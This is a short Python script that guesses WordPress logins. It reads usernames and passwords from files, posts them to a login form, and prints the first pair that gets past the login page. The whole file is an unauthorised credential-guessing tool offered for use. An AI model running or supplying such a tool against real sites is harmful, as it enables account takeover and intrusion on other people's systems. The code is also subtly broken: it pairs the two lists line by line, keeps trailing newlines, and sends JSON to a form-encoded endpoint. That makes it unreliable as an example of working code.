import http.client
import urllib.parse
import json

host = input("enter hostname : ")
path = input("enter path to form : ")
port = int(input("enter port : "))
userfile = input("path to usernames file : ")
passwdfile = input("path to passwords file : ")


try:
	c = http.client.HTTPConnection(host, port)
	userlist = open(userfile).readlines()
	passwdlist = open(passwdfile).readlines()
	for user, passwd in zip(userlist, passwdlist):
		data = {'log': user,
				'pwd': passwd,
				'submit': 'Login'}
		c.request('POST', path, json.dumps(data))
		resp = c.getresponse()
		if not 'WordPress Login' in resp.read().decode():
			print(user, passwd)
			break

except ConnectionRefusedError:
	print("Connection failed")
